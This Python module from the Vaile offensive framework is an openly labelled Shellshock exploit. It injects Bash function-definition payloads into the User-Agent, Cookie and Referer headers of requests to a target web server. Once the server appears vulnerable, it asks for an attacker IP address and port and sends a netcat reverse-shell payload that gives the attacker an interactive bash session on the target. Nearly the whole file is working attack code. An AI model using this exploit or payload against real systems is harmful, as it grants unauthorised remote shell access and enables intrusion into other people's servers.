#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import requests
import time
from random import *
import string
import re
from core.Core.colors import *

info = "Shellshock Exploit."
searchinfo = "Shellshock Exploit"
properties = {}

def shellshock0x00(web):

    print(GR+' [*] Parsing strings...')
    time.sleep(0.5)
    r_str = ''.join(Random().sample(string.letters, 30))
    print(GR+' [*] Configuring payloads...')
    con = '() { :;}; echo; echo; echo %s'%(r_str)
    cmd = "() { test;};/bin/nopatchobfu"
    headers = {'User-agent': cmd}
    time.sleep(0.5)
    print(O+' [*] Making no-verify request...')
    time.sleep(1)
    r = requests.get(web, headers=headers, verify=False)
    if r.status_code == 500 or r.status_code == 502:
        print(G+' [+] The website seems Vulnerable to Shellshock...')
        time.sleep(0.5)
        print(O+' [*] Confirming the vulnerability...')

        headers = {
                    'User-Agent' : con,
                    'Cookie'     : con,
                    'Referer'    : con
                }

        resp = requests.get(web, headers=headers, verify=False)
        if resp.status_code == 200:
            if re.search(r_str,resp.content,re.I):
                print(G+' [+] ShellShock was found in: %s'%(resp.url))
                print(GR+' [*] Preparing for the exploitation phase...')
                time.sleep(0.4)
                print(GR+' [*] Configuring payload...')
                ip = input(O+' [#] Enter reverse IP :> ')
                port = input(' [#] Enter port :> ')
                exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
                time.sleep(0.7)
                print(C+' [!] Using payload : '+B+exp)
                print(GR+' [*] Exploiting...')
                time.sleep(1)
                print(O+' [!] Using no-verify mode to avoid IP leakage...')
                try:
                    head = {'User-agent':exp}
                    r=requests.get(web, headers=head, verify=False)
                except:
                    print(R+' [-] Exploit failed...')

        else:
            print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
            print(O+' [!] Please check manually...')
    else:
        print(R+' [-] The web seems immune to shellshock...')

def shellshock_exp(web):

    print(GR+'\n [*] Loading module...')
    time.sleep(0.5)
    print(R+'\n    ================================')
    print(R+'     S H E L L S H O C K  (Exploit)')
    print(R+'    ================================\n')
    shellshock0x00(web)

def attack(web):
    shellshock_exp(web)